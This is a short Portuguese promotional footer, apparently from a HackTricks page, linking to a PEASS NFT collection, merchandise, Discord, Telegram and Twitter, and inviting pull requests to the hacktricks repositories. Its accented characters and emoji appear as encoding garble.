* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para o** [**reposit√≥rio hacktricks**](https://github.com/carlospolop/hacktricks) **e o** [**reposit√≥rio hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
